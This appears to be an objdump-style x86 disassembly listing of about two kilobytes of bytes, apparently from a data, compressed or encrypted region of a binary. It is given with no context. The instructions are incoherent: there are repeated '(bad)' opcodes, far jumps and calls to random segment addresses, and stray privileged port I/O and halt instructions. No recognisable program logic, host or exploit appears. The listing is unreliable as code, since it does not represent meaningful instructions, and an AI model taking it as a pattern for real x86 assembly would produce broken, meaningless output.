  409247:	call   0xe854:0x74488189
  40924e:	sub    BYTE PTR [ebx],dl
  409250:	daa    
  409251:	mov    eax,0x2d4fa00a
  409256:	bound  ebx,QWORD PTR [ebp-0x57d40b7b]
  40925c:	inc    ebx
  40925d:	jecxz  0x409287
  40925f:	and    al,0x5a
  409261:	push   esi
  409262:	mov    esp,0x42067f3f
  409267:	sub    eax,0xedfb6004
  40926c:	call   0xd5e4:0xf27af446
  409273:	retf   
  409274:	sub    al,0x61
  409276:	fcomp  QWORD PTR [ebp+0x32769efa]
  40927c:	pop    ebp
  40927d:	out    dx,eax
  40927e:	(bad)  
  40927f:	and    DWORD PTR [ebp+ecx*2-0x6c],edi
  409283:	mov    dl,0xdb
  409285:	xor    BYTE PTR [ebp+0x6f],al
  409288:	jbe    0x409255
  40928a:	shl    BYTE PTR [edx],1
  40928c:	xor    ecx,DWORD PTR [edi-0xc1cdf69]
  409292:	cmp    esi,ebp
  409294:	sbb    eax,DWORD PTR [edi]
  409296:	scas   eax,DWORD PTR es:[edi]
  409297:	xor    eax,0xe2f20b0d
  40929c:	imul   esi,DWORD PTR [edi+0x6248794c],0x4a1c6672
  4092a6:	js     0x40927d
  4092a8:	or     DWORD PTR [ebx],edx
  4092aa:	stc    
  4092ab:	xchg   esi,eax
  4092ac:	and    BYTE PTR [ebx],ah
  4092ae:	xor    BYTE PTR ds:0x12c1779a,al
  4092b4:	mov    edi,0x7d558f51
  4092b9:	ret    0xb0fa
  4092bc:	jle    0x40931d
  4092be:	out    0x4d,eax
  4092c0:	hlt    
  4092c1:	(bad)  
  4092c2:	jmp    0x409249
  4092c4:	push   esi
  4092c5:	out    dx,eax
  4092c6:	cdq    
  4092c7:	mov    eax,0x4037979e
  4092cc:	adc    BYTE PTR [ebp-0x78],ah
  4092cf:	(bad)  
  4092d1:	fmulp  st(4),st
  4092d3:	fisttp QWORD PTR [edx]
  4092d5:	jb     0x40925d
  4092d7:	in     al,dx
  4092d8:	add    eax,0x1d147e15
  4092dd:	and    BYTE PTR [edx-0x38],ah
  4092e0:	push   edx
  4092e1:	mov    ds:0x4a59afe5,al
  4092e6:	scas   eax,DWORD PTR es:[edi]
  4092e7:	dec    eax
  4092e8:	mov    ecx,0x51189c02
  4092ed:	and    al,0x2f
  4092ef:	jle    0x409352
  4092f1:	out    dx,al
  4092f2:	xchg   esi,edi
  4092f4:	add    ebx,esi
  4092f6:	jl     0x4092e7
  4092f8:	push   ebx
  4092f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092fa:	push   ebp
  4092fb:	das    
  4092fc:	cmp    eax,0x264a2360
  409301:	inc    edx
  409302:	mov    BYTE PTR [edx-0x66],dl
  409305:	shl    DWORD PTR [esi-0x69433753],0x48
  40930c:	adc    al,0xd8
  40930e:	(bad)  
  40930f:	scas   eax,DWORD PTR es:[edi]
  409310:	lods   eax,DWORD PTR ds:[esi]
  409311:	sbb    eax,0x17e71613
  409316:	add    eax,0x51ab59c7
  40931b:	adc    DWORD PTR ds:0xe3a08c88,edx
  409321:	and    BYTE PTR [ebp-0x2b],ah
  409324:	scas   eax,DWORD PTR es:[edi]
  409325:	psllw  mm5,mm4
  409328:	popa   
  409329:	jecxz  0x409351
  40932b:	sub    eax,DWORD PTR [esi-0x58]
  40932e:	dec    esi
  40932f:	sbb    eax,0x344109a
  409334:	jnp    0x40930d
  409336:	or     al,0xde
  409338:	mov    ebx,0x5202230e
  40933d:	(bad)  
  40933e:	leave  
  40933f:	(bad)  
  409340:	std    
  409341:	xor    dh,cl
  409343:	pop    ecx
  409344:	jmp    0x6b6f:0x516878fe
  40934b:	gs call 0x5a55:0xb41ed5d8
  409353:	test   eax,0x234bc01b
  409358:	loope  0x409342
  40935a:	dec    eax
  40935b:	sub    BYTE PTR [edx],cl
  40935d:	cs popa 
  40935f:	(bad)  
  409360:	sar    BYTE PTR [eax+0x44f90242],cl
  409366:	cld    
  409367:	and    dh,BYTE PTR [ecx+0x5f]
  40936a:	inc    edx
  40936b:	in     eax,0x7d
  40936d:	scas   eax,DWORD PTR es:[edi]
  40936e:	arpl   WORD PTR [eax+0x1f],di
  409371:	(bad)  
  409372:	cmp    al,0x8e
  409374:	adc    dl,ch
  409376:	pop    ebp
  409377:	int3   
  409378:	push   ebp
  409379:	cli    
  40937a:	gs enter 0xc041,0x82
  40937f:	test   eax,0x2f2092d
  409384:	(bad)  
  409386:	pop    ds
  409387:	push   edi
  409388:	mov    ss,WORD PTR ss:[ebx-0x1f]
  40938c:	or     al,0x8d
  40938e:	xchg   edi,eax
  40938f:	imul   ecx,DWORD PTR [ebx+ecx*4],0x380e44bd
  409396:	mov    ebp,0x6648d7ea
  40939b:	add    al,0xf5
  40939d:	jge    0x40935c
  40939f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093a1:	or     edi,DWORD PTR [ecx+0x1a]
  4093a4:	js     0x409415
  4093a6:	mov    ebx,0xf336fd2b
  4093ab:	mov    ch,0xfa
  4093ad:	pop    edx
  4093ae:	pop    eax
  4093af:	fwait
  4093b0:	jmp    0xa286:0xb54afaed
  4093b7:	loopne 0x409359
  4093b9:	sbb    ah,dl
  4093bb:	shl    ch,cl
  4093bd:	mov    ecx,0x18a26c9f
  4093c2:	stos   DWORD PTR es:[edi],eax
  4093c3:	xchg   ebp,eax
  4093c5:	daa    
  4093c6:	in     al,dx
  4093c7:	(bad)  
  4093c8:	dec    ecx
  4093c9:	jg     0x4093b4
  4093cb:	push   eax
  4093cc:	push   ss
  4093cd:	int    0x36
  4093cf:	inc    edx
  4093d0:	sub    BYTE PTR [ebx-0x37b451fd],ch
  4093d6:	icebp  
  4093d7:	mov    esi,0x2a13e080
  4093dc:	stos   DWORD PTR es:[edi],eax
  4093dd:	pop    ebp
  4093de:	xchg   ecx,eax
  4093df:	lahf   
  4093e0:	aam    0x5f
  4093e2:	pop    edx
  4093e3:	out    dx,eax
  4093e4:	jae    0x4093a8
  4093e6:	push   0xf1ba254d
  4093eb:	cmp    eax,0xc0def645
  4093f0:	repnz outs dx,BYTE PTR ds:[esi]
  4093f2:	mov    al,0x1f
  4093f4:	fsub   DWORD PTR [ebx+ebx*2-0x571cc146]
  4093fb:	jo     0x40941f
  4093fd:	xchg   BYTE PTR [eax-0xaf173bf],ch
  409403:	fbld   TBYTE PTR [ebp+0x277e2729]
  409409:	pop    ebx
  40940a:	retf   0x21
  40940d:	out    0xe8,al
  40940f:	mov    bl,0x14
  409411:	stos   DWORD PTR es:[edi],eax
  409412:	aad    0x41
  409414:	jmp    0xdacf:0x1d2fe4d4
  40941b:	pop    ds
  40941c:	jbe    0x4093a5
  40941e:	dec    ecx
  40941f:	fistp  WORD PTR [ecx+0x63]
  409422:	leave  
  409423:	xor    dh,BYTE PTR ds:0xe63df216
  409429:	pop    edx
  40942a:	daa    
  40942b:	out    dx,eax
  40942c:	push   cs
  40942d:	jnp    0x409426
  40942f:	mov    ecx,0xbc04f7f
  409434:	jl     0x40940b
  409436:	jmp    0x40947a
  409438:	cmp    eax,DWORD PTR [eax-0x5f]
  40943b:	push   ebx
  40943c:	dec    esp
  40943d:	test   ecx,esi
  40943f:	add    eax,0x3b0de55e
  409444:	fisttp QWORD PTR [ebp-0x33]
  409447:	aaa    
  409448:	pop    esp
  409449:	mov    dl,0x3e
  40944b:	in     eax,dx
  40944c:	mov    dh,0x70
  40944e:	sub    edi,DWORD PTR [ecx+0x7817c172]
  409454:	or     al,0x1a
  409456:	loopne 0x409413
  409458:	loope  0x409479
  40945a:	cdq    
  40945b:	(bad)  
  40945d:	mov    ebx,0x2e012e68
  409462:	cmp    DWORD PTR [ebx],ebx
  409464:	lahf   
  409465:	movhps xmm6,QWORD PTR [ebx]
  409468:	cli    
  409469:	push   0xffffffe5
  40946b:	sub    edi,eax
  40946d:	and    ah,0x94
  409470:	das    
  409471:	or     eax,0x31623e10
  409476:	rol    ch,0x20
  409479:	xchg   ebp,eax
  40947a:	mov    bh,0x7
  40947c:	aam    0x94
  40947e:	and    al,0x27
  409480:	imul   esi,DWORD PTR [ecx-0x1af1bce8],0x6a
  409487:	outs   dx,DWORD PTR ds:[esi]
  409488:	pminsw mm5,QWORD PTR [esi-0xb]
  40948c:	imul   ecx,edi,0xc8f41517
  409492:	aas    
  409493:	loope  0x409510
  409495:	outs   dx,DWORD PTR ds:[esi]
  409496:	daa    
  409497:	dec    edi
  409498:	push   esp
  409499:	popf   
  40949a:	pop    edi
  40949b:	add    al,0xa6
  40949d:	push   es
  40949e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40949f:	ss xor cl,bh
  4094a2:	imul   ebp,DWORD PTR [edi],0xfe01265c
  4094a8:	jmp    0xad67:0x12cec874
  4094af:	shl    BYTE PTR [esi+0x2c3ab5e9],1
  4094b5:	xchg   ebx,eax
  4094b6:	not    BYTE PTR ss:[esi]
  4094b9:	dec    ecx
  4094ba:	sub    ebp,DWORD PTR ds:0x33682ff
  4094c0:	dec    edx
  4094c1:	sbb    bh,BYTE PTR [edx+eiz*8+0x159aeba]
  4094c8:	inc    edi
  4094c9:	ds mov dh,0x85
  4094cc:	addr16 push eax
  4094ce:	dec    esi
  4094cf:	cmp    ch,BYTE PTR [edx]
  4094d1:	push   es
  4094d2:	shl    dh,1
  4094d4:	dec    edx
  4094d5:	hlt    
  4094d6:	loop   0x409480
  4094d8:	and    BYTE PTR [ecx-0x284dede0],ch
  4094de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094df:	in     al,0x48
  4094e1:	shr    BYTE PTR [edx],1
  4094e3:	pop    eax
  4094e4:	adc    ebp,edx
  4094e6:	sub    eax,0xd954b92d
  4094eb:	and    dl,BYTE PTR [ebp+0x17]
  4094ee:	call   0x653e:0xe05b57b2
  4094f5:	xchg   DWORD PTR [esp+eax*4-0x4f95bbaa],ebp
  4094fc:	mov    al,ds:0x1e1017a1
  409501:	and    eax,0xa281e551
  409506:	repz mov ds:0xf5b994fe,eax
  40950c:	mov    ah,0xb0
  40950e:	mov    eax,ds:0x866665ae
  409513:	sti    
  409514:	mov    eax,0x8ac1240c
  409519:	jmp    0x4094f0
  40951b:	call   0x5f4d705e
  409520:	mov    WORD PTR [esi+0x47403f95],es
  409526:	inc    ecx
  409527:	fwait
  409528:	and    DWORD PTR [edi+0x49],ebx
  40952b:	mov    ds:0x6096fde8,eax
  409530:	or     DWORD PTR [ecx+0x177fed5d],ecx
  409536:	and    BYTE PTR [ecx],ah
  409538:	jle    0x409575
  40953a:	retf   0xadea
  40953d:	fbld   TBYTE PTR [ebx-0x6b]
  409541:	ins    DWORD PTR es:[edi],dx
  409542:	jge    0x409530
  409544:	jmp    0xdfa4:0x827305f
  40954b:	sar    BYTE PTR ds:0x68f048e0,1
  409551:	aam    0xe7
  409553:	add    al,0x68
  409555:	or     BYTE PTR [edi+0x33b263b],0x53
  40955c:	in     eax,dx
  40955d:	rcr    BYTE PTR [ecx-0x588b897f],1
  409563:	ficomp WORD PTR [ecx+0x50]
  409566:	rcl    BYTE PTR [ecx],0x6a
  409569:	addr16 mov edx,0x94f1e7a
  40956f:	and    edi,DWORD PTR [ebp+0x4c]
  409572:	out    dx,al
  409573:	inc    ecx
  409574:	iret   
  409575:	and    al,0xf9
  409577:	jl     0x409550
  409579:	pop    esi
  40957a:	into   
  40957b:	or     al,0x9f
  40957d:	inc    edi
  40957e:	retf   0x2997
  409581:	mov    edi,0xc19a99a4
  409586:	mov    bh,0x45
  409588:	push   ecx
  409589:	add    eax,0x63dff2cc
  40958e:	js     0x409605
  409590:	leave  
  409591:	pop    eax
  409592:	retf   
  409593:	inc    ecx
  409594:	xchg   ecx,eax
  409595:	loop   0x409550
  409597:	pop    ds
  409598:	lds    ebp,FWORD PTR [ebp+0x78]
  40959b:	ficomp DWORD PTR [bp-0x46cf]
  4095a0:	nop
  4095a1:	sub    esp,DWORD PTR [esi-0x7ab9aa6c]
  4095a7:	pop    es
  4095a8:	aas    
  4095a9:	fisttp QWORD PTR [edi-0x7c]
  4095ac:	pop    ebx
  4095ad:	xchg   DWORD PTR [eax-0x19563337],esi
  4095b3:	sub    edi,edi
  4095b5:	jmp    0x5e047be
  4095ba:	retf   0x9de6
  4095bd:	jmp    0xc054:0xa22a8c0f
  4095c4:	sar    BYTE PTR [eax-0x7b22ef7b],1
  4095ca:	and    BYTE PTR [esi],dl
  4095cc:	loop   0x4095dd
  4095ce:	and    DWORD PTR [edx],edx
  4095d0:	mov    ebp,0xbf0d7002
  4095d5:	jmp    0x40958d
  4095d7:	mov    eax,0xb5bfe724
  4095dc:	out    dx,al
  4095dd:	cli    
  4095de:	fcomp  QWORD PTR [ecx]
  4095e0:	dec    ecx
  4095e1:	mov    edx,0xde62ef33
  4095e6:	or     eax,0x85a2a0b8
  4095eb:	mov    cl,0xba
  4095ed:	mov    ebp,0xcaad2346
  4095f2:	or     DWORD PTR [edi-0x5da229cc],0xbfe80364
  4095fc:	pop    edx
  4095fd:	cli    
  4095fe:	sbb    al,0xaf
  409600:	loope  0x4095f1
  409602:	add    eax,0xc41ff786
  409607:	push   ss
  409608:	fild   DWORD PTR [ebx-0x292abc4d]
  40960e:	adc    dh,cl
  409610:	and    ebp,edi
  409612:	add    ch,BYTE PTR [ebx]
  409614:	loope  0x4095f7
  409616:	aas    
  409617:	pop    ss
  409618:	mov    ch,dl
  40961a:	rcl    BYTE PTR [ebx],cl
  40961c:	mov    ch,BYTE PTR [edx-0x4c4f9e1f]
  409622:	jmp    0x537d:0x89da6924
  409629:	pop    es
  40962a:	xchg   BYTE PTR [ebx+0x2c3b464],dl
  409630:	jb     0x409683
  409632:	add    dh,BYTE PTR [ebx]
  409634:	fcom   DWORD PTR [ebx]
  409636:	pop    ss
  409637:	push   0x4d
  409639:	and    eax,0xd5ba254f
  40963e:	push   es
  40963f:	dec    ebp
  409640:	pop    ebx
  409641:	xor    ebx,edx
  409643:	mov    al,ds:0xe6ecf01e
  409648:	xchg   ecx,eax
  409649:	xchg   ebx,eax
  40964a:	je     0x409630
  40964c:	xchg   ecx,eax
  40964d:	test   BYTE PTR [ebx-0x281511bf],0x94
  409654:	outs   dx,BYTE PTR ds:[esi]
  409655:	cwde   
  409656:	jne    0x409609
  409658:	std    
  409659:	aad    0x62
  40965b:	out    dx,eax
  40965c:	mov    edx,0x1171184a
  409661:	outs   dx,DWORD PTR ds:[esi]
  409662:	fsub   DWORD PTR [edx-0x313f4854]
  409668:	loop   0x409647
  40966a:	or     eax,0x99dfb849
  40966f:	imul   esp,DWORD PTR ds:0x91f7f339,0x5f
  409676:	fs adc eax,0xd7caa07c
  40967c:	cli    
  40967d:	mov    cl,BYTE PTR [eax+0x4676d26]
  409683:	fimul  DWORD PTR [ecx+0x3a]
  409686:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409688:	and    edx,DWORD PTR [esi+0x55201ae0]
  40968e:	pusha  
  40968f:	mov    esi,0x8eac8794
  409694:	mov    eax,0x44fa89d5
  409699:	inc    ebp
  40969a:	loope  0x4096cb
  40969c:	xor    eax,0x2fcec45
  4096a1:	cs aaa 
  4096a3:	imul   ebx,DWORD PTR [ecx],0x518e2e15
  4096a9:	push   ecx
  4096aa:	int3   
  4096ab:	(bad)  
  4096ac:	clc    
  4096ad:	pop    eax
  4096ae:	jl     0x409653
  4096b0:	dec    ebp
  4096b1:	jo     0x40963a
  4096b3:	mov    esp,0xca51eb79
  4096b8:	mov    ecx,0x2a58482c
  4096bd:	jo     0x409705
  4096bf:	gs scas al,BYTE PTR es:[edi]
  4096c1:	inc    edx
  4096c2:	mov    dh,0xfb
  4096c4:	inc    BYTE PTR [esi]
  4096c6:	fwait
  4096c7:	ret    0x909d
  4096ca:	(bad)  
  4096cb:	cmp    esp,edi
  4096cd:	sahf   
  4096ce:	gs xchg esi,eax
  4096d0:	inc    esi
  4096d1:	jp     0x409737
  4096d3:	mov    bl,0xa8
  4096d5:	mov    ds:0x7a12f0a5,al
  4096da:	cmp    dl,BYTE PTR [esp+ebx*1]
  4096dd:	mov    al,ds:0xad8e30c8
  4096e2:	scas   eax,DWORD PTR es:[edi]
  4096e3:	sbb    ah,ch
  4096e5:	sub    eax,0x58e8a3f3
  4096ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096eb:	test   al,0xb1
  4096ed:	lods   eax,DWORD PTR ds:[esi]
  4096ee:	arpl   WORD PTR [ebp+ebx*4-0x260fc1d9],dx
  4096f5:	xor    ecx,DWORD PTR [ebx+eax*2+0x2b]
  4096f9:	and    esi,DWORD PTR [edx+0x0]
  4096fc:	xchg   edx,eax
  4096fd:	rcl    DWORD PTR [eax+0x58c691be],cl
  409703:	loopne 0x4096fd
  409705:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  409707:	add    eax,0xa6e8fa57
  40970c:	lds    esp,FWORD PTR [edi+0x63cd4c76]
  409712:	sbb    ebx,ebp
  409714:	shr    al,0xff
  409717:	sub    edx,DWORD PTR [edx-0x6d]
  40971a:	fadd   DWORD PTR [ecx-0x18ce2472]
  409720:	call   0xaa696a66
  409725:	adc    dh,BYTE PTR [ecx]
  409727:	push   esp
  409728:	ds sub ah,cl
  40972b:	ins    BYTE PTR es:[edi],dx
  40972c:	or     ecx,DWORD PTR [eax+0x12]
  40972f:	shl    DWORD PTR [ebx-0x51db1de9],0x3
  409736:	jbe    0x409743
  409738:	pop    esp
  409739:	popf   
  40973a:	into   
  40973b:	inc    ebx
  40973c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40973d:	jns    0x4096fd
  40973f:	cli    
  409740:	fnstsw WORD PTR [ebx+ecx*4]
  409743:	and    dh,bl
  409745:	jnp    0x409772
  409747:	fmul   QWORD PTR [ebp-0x7c9e044]
  40974d:	(bad)  
  40974e:	jecxz  0x4096ee
  409750:	ffreep st(0)
  409752:	jle    0x4097d2
  409754:	dec    edx
  409755:	out    0x4d,al
  409757:	rcr    DWORD PTR [ebp-0x4fd1a2f9],cl
  40975d:	in     al,0x40
  40975f:	in     al,dx
  409760:	dec    BYTE PTR [ecx+esi*2-0x77]
  409764:	imul   BYTE PTR [ecx-0x67]
  409767:	mov    fs,WORD PTR [edi+0x3a8f36e6]
  40976d:	cmp    BYTE PTR [esi+0x2c506b73],al
  409773:	jmp    FWORD PTR [edx-0x2be3100c]
  409779:	ds ret 
  40977b:	addr16 sbb al,0xd8
  40977e:	inc    edi
  40977f:	xchg   edi,eax
  409780:	dec    eax
  409781:	in     al,dx
  409782:	loope  0x409791
  409784:	sub    dl,dh
  409786:	sbb    BYTE PTR [esi+0x4a],0x5f
  40978a:	xchg   DWORD PTR [eax-0x3522e3ac],ebx
  409790:	not    DWORD PTR [edx]
  409792:	aam    0xfe
  409794:	in     al,0x74
  409796:	cmp    al,0x48
  409798:	lock stos BYTE PTR es:[edi],al
  40979a:	adc    dl,BYTE PTR [ebx+0x1088c2c5]
  4097a0:	dec    edi
  4097a1:	cmp    ebp,DWORD PTR [esp+ebp*1+0x566eb2dd]
  4097a8:	das    
  4097a9:	clc    
  4097aa:	inc    bp
  4097ac:	mov    bh,0x2a
  4097ae:	push   esi
  4097af:	and    ebp,DWORD PTR [edi+0x7a]
  4097b2:	cmp    DWORD PTR [ebx],eax
  4097b4:	and    eax,0xfffffff2
  4097b7:	fldcw  WORD PTR es:[ebx+0x79]
  4097bb:	sbb    edi,DWORD PTR [eax+0x4]
  4097be:	mov    ?,edx
  4097c0:	paddusb mm3,QWORD PTR [edi+0x7b194734]
  4097c7:	(bad)  
  4097c8:	mov    bh,BYTE PTR [esi]
  4097ca:	hlt    
  4097cb:	outs   dx,BYTE PTR ds:[esi]
  4097cc:	mov    edi,0xa63c1659
  4097d1:	push   es
  4097d2:	and    BYTE PTR [edi],cl
  4097d4:	xchg   ecx,eax
  4097d5:	lods   al,BYTE PTR ds:[esi]
  4097d6:	std    
  4097d7:	dec    esp
  4097d8:	pop    edi
  4097d9:	and    ebx,ecx
  4097db:	mov    dl,0x3
  4097dd:	fwait
  4097de:	mov    ecx,0xa6297e43
  4097e3:	loop   0x409857
  4097e5:	or     al,BYTE PTR [ebx+0xff3f5c5]
  4097eb:	test   eax,0xe808eb16
  4097f0:	out    dx,al
  4097f1:	mov    ebp,edx
  4097f3:	(bad)  
  4097f4:	pushf  
  4097f5:	cmp    eax,0xbf0c9c51
  4097fa:	sbb    al,0xc
  4097fc:	ja     0x4097ea
  4097fe:	das    
  4097ff:	add    dl,BYTE PTR [edi+eax*8+0x12]
  409803:	call   0x45876e96
  409808:	jb     0x4097c4
  40980a:	xchg   edi,eax
  40980b:	mov    dl,0x67
  40980d:	lds    eax,FWORD PTR [ebp+0x12e9c3c5]
  409813:	push   es
  409814:	or     eax,0xf4861222
  409819:	jmp    0x9b26:0x3f510490
  409820:	ret    
  409821:	dec    ebx
  409822:	(bad)  
  409823:	fs pushf 
  409825:	and    DWORD PTR [esi+0x19ff13b6],esp
  40982b:	repz xlat BYTE PTR ds:[ebx]
  40982d:	cmp    bh,0x5a
  409830:	popf   
  409831:	icebp  
  409832:	(bad)  
  409834:	ret    0x1315
  409837:	push   0x8eec49d0
  40983c:	mov    DWORD PTR [edx+0x691736bd],ebx
  409842:	or     al,ch
  409844:	xor    DWORD PTR [edx],esi
  409846:	fidiv  WORD PTR [ebx+0xc]
  409849:	ret    0x79db
  40984c:	test   eax,0x1a175e9d
  409851:	sbb    eax,0x4d983567
  409856:	pop    DWORD PTR [esi-0x6]
  409859:	mov    bh,0xfc
  40985b:	pop    esi
  40985c:	or     dh,BYTE PTR [ebx+0x5a9365d4]
  409862:	mov    bh,0xf3
  409864:	(bad)  
  409865:	icebp  
  409866:	in     eax,0x6
  409868:	repz mov dh,0x67
  40986b:	cmp    al,0xe8
  40986d:	sub    BYTE PTR [edi-0x66f022fd],dl
  409873:	push   ebp
  409874:	sub    DWORD PTR [edx+0x28757d07],edx
  40987a:	xor    ebx,DWORD PTR [edx-0x19]
  40987d:	nop
  40987e:	aam    0xd2
  409880:	xchg   edi,eax
  409881:	mov    eax,ds:0x9457f894
  409886:	repnz xchg esp,eax
  409888:	and    eax,DWORD PTR [edi]
  40988a:	xchg   ebp,eax
  40988b:	and    al,BYTE PTR [ebp-0x58]
  40988e:	mov    edx,0xa16b48e6
  409893:	nop
  409894:	fadd   QWORD PTR ds:0xf21c573c
  40989a:	cmp    DWORD PTR [ebx],esp
  40989c:	popf   
  40989d:	jns    0x4098aa
  40989f:	jg     0x409904
  4098a1:	xor    BYTE PTR [edi+eax*2+0x51],al
  4098a5:	mov    ebp,0xa0419397
  4098aa:	add    bl,cl
  4098ac:	xor    al,0xc9
  4098ae:	sub    al,ah
  4098b0:	cmp    esp,DWORD PTR [esi-0xa733910]
  4098b6:	mov    WORD PTR [edi+0x2c],cs
  4098b9:	mov    eax,ds:0x7a4ac50d
  4098be:	inc    eax
  4098bf:	fcom   st(2)
  4098c1:	pop    ecx
  4098c2:	mov    fs,edx
  4098c4:	push   edx
  4098c5:	repz in eax,dx
  4098c7:	bound  eax,QWORD PTR [edx+0x217570cc]
  4098cd:	push   edi
  4098ce:	test   BYTE PTR [ebp-0x39],0xf3
  4098d2:	xchg   BYTE PTR [edi+ebp*1+0x26],bl
  4098d6:	cmp    BYTE PTR [ecx],ah
  4098d8:	or     edi,DWORD PTR [ebx+0x7e83f1c0]
  4098de:	gs nop
  4098e0:	and    eax,0x6e4a4bd5
  4098e5:	xor    BYTE PTR [ebp+esi*8-0x1e],dh
  4098e9:	or     eax,0x3aab232a
  4098ee:	push   ds
  4098ef:	push   edx
  4098f0:	sub    ebx,ecx
  4098f2:	xor    BYTE PTR [eax+0x11],ch
  4098f5:	add    ebx,ecx
  4098f7:	fst    QWORD PTR ds:0xafef88af
  4098fd:	in     eax,0x8
  4098ff:	inc    ebx
  409900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409901:	imul   edi,DWORD PTR [edi-0x692475ef],0x7d
  409908:	xchg   BYTE PTR [eax-0x42],cl
  40990b:	sub    edi,DWORD PTR [esi+0x77f15425]
  409911:	fstp   TBYTE PTR [edx+ebp*1+0x23019b1e]
  409918:	dec    ebp
  409919:	pop    ebx
  40991a:	pushf  
  40991b:	stos   BYTE PTR es:[edi],al
  40991c:	sbb    DWORD PTR [ebp-0x2f],esi
  40991f:	pop    ecx
  409920:	pop    esp
  409921:	jnp    0x409917
  409923:	xchg   ecx,eax
  409924:	mov    ebx,edi
  409926:	pop    edx
  409927:	mov    eax,0xe43d891b
  40992c:	mov    bl,0xac
  40992e:	mov    ds:0xbd0d06d4,eax
  409933:	mov    ah,0x48
  409935:	ins    DWORD PTR es:[edi],dx
  409936:	mov    eax,0xae182c21
  40993b:	pop    ebx
  40993c:	inc    esp
  40993d:	cmp    al,0x47
  40993f:	mov    edi,0x61af99e2
  409944:	cs push ebx
  409946:	hlt    
  409947:	cmp    DWORD PTR [ebx-0xcd0dae],0xffffff97
  40994e:	int    0x95
  409950:	and    cl,BYTE PTR [esi+0x36]
  409953:	add    DWORD PTR [eax+edx*2+0x5323fde5],ecx
  40995a:	mov    ah,0x1
  40995c:	imul   eax,DWORD PTR [eax-0x80],0xa0c7b476
  409963:	sbb    eax,0xacf30edc
  409968:	ret    0xac6a
  40996b:	loopne 0x4099c5
  40996d:	sub    DWORD PTR [ebp-0x4f],esi
  409970:	dec    edx
  409971:	jge    0x409948
  409973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409974:	rol    esi,cl
  409976:	in     eax,0xa2
  409978:	call   0x80744d8e
  40997d:	mov    ebp,0xa2d017f3
  409982:	daa    
  409983:	(bad)  
  409984:	mov    dl,0x4f
  409986:	test   BYTE PTR [edx+0x53d95702],bl
  40998c:	sbb    DWORD PTR ds:0xd2652464,esp
  409992:	mov    ebx,0x396d80e4
  409997:	ror    BYTE PTR [ebp-0x1f],0x84
  40999b:	gs in  al,dx
  40999d:	jmp    0x409965
  40999f:	aas    
  4099a0:	loope  0x409931
  4099a2:	mov    edi,fs
  4099a4:	cli    
  4099a5:	mov    ds:0xd3d7ba76,al
  4099aa:	cmp    dh,BYTE PTR [ebx]
  4099ac:	cld    
  4099ad:	les    ecx,FWORD PTR [ebx]
  4099af:	inc    ecx
  4099b0:	jne    0x4099a9
  4099b2:	(bad)  
  4099b3:	fst    st(4)
  4099b5:	adc    eax,0x24b65a05
  4099ba:	mov    ebx,0x6a90459d
  4099bf:	mov    ecx,DWORD PTR [edx+0x31]
  4099c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c3:	cmp    BYTE PTR [edi],dl
  4099c5:	out    dx,eax
  4099c6:	mov    ah,BYTE PTR [ecx+0x33d3b6e3]
  4099cc:	test   esp,edx
  4099ce:	stos   BYTE PTR es:[edi],al
  4099cf:	(bad)  
  4099d0:	jecxz  0x409965
  4099d2:	popa   
  4099d3:	adc    cl,BYTE PTR [ebx]
  4099d5:	push   es
  4099d6:	add    al,0x99
  4099d8:	lods   eax,DWORD PTR ds:[esi]
  4099d9:	mov    esi,0x4bf97a92
  4099de:	xchg   DWORD PTR [eax],edi
  4099e0:	pop    eax
  4099e1:	push   esp
  4099e2:	test   BYTE PTR [esi],bl
  4099e4:	in     eax,0xcf
  4099e6:	cmp    DWORD PTR [ebx],edx
  4099e8:	out    dx,al
  4099e9:	jne    0x409a13
  4099eb:	ret    
  4099ec:	pushf  
  4099ed:	and    ch,BYTE PTR [esi-0x70]
  4099f0:	or     al,0x59
  4099f2:	dec    ebp
  4099f3:	gs ss loop 0x409a40
  4099f7:	dec    edx
  4099f8:	fwait
  4099f9:	xchg   esi,eax
  4099fa:	out    dx,al
  4099fb:	jecxz  0x4099e0
  4099fd:	jbe    0x4099a0
  4099ff:	jno    0x4099d4
  409a01:	repnz out dx,eax
  409a03:	xor    BYTE PTR [edi-0x5caa703d],cl
  409a09:	push   ebx
  409a0a:	dec    ecx
  409a0b:	xchg   edi,eax
  409a0c:	jge    0x409a74
  409a0e:	jno    0x409a05
  409a10:	sbb    eax,edi
  409a12:	adc    BYTE PTR [edx+0x78],dl
  409a15:	pop    edx
  409a16:	inc    ecx
  409a17:	imul   edi,DWORD PTR [ebp+0x26],0xffffffc8
  409a1b:	adc    DWORD PTR [eax],esp
  409a1d:	or     edx,DWORD PTR [esi-0x6a]
  409a20:	mov    al,cs:0x3585e24e
  409a26:	pop    ss
  409a27:	and    al,0x83
  409a29:	outs   dx,DWORD PTR ds:[esi]
  409a2a:	hlt    
  409a2b:	aaa    
  409a2c:	or     eax,DWORD PTR [ebp+0x1a]
  409a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a30:	xlat   BYTE PTR ds:[ebx]
  409a31:	jg     0x409a2c
  409a33:	ins    DWORD PTR es:[edi],dx
  409a34:	push   ds
  409a35:	xor    dl,bl
  409a37:	outs   dx,BYTE PTR ds:[esi]
  409a38:	scas   al,BYTE PTR es:[edi]
  409a39:	push   edi
  409a3a:	scas   al,BYTE PTR es:[edi]
  409a3b:	dec    ecx
  409a3c:	in     al,dx
  409a3d:	sbb    eax,0x601b4753
  409a42:	mov    bh,0x11
  409a44:	mov    ebp,0xfe2ac2d2
  409a49:	dec    ebp
  409a4a:	sub    DWORD PTR [edx-0x6],esi
  409a4d:	(bad)  
  409a4f:	adc    eax,0xc4cc8c2c
  409a54:	cdq    
  409a55:	mov    gs,WORD PTR ds:[ecx-0x7f]
  409a59:	shl    BYTE PTR [ecx-0x15],0xc5
  409a5d:	xchg   edi,eax
  409a5e:	enter  0xd217,0xfe
  409a62:	xor    bh,al
